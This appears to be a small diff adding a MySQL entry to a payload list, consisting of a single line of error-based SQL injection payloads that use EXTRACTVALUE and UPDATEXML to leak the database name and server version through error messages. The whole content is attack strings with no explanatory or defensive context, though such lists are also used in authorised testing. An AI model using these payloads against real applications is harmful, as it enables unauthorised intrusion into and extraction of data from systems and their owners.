@@ -1,0 +1,3 @@
+# MySQL
+
+EXTRACTVALUE(1,CONCAT(0x5c,database())), UPDATEXML(1,CONCAT(0x5c,version()),1)
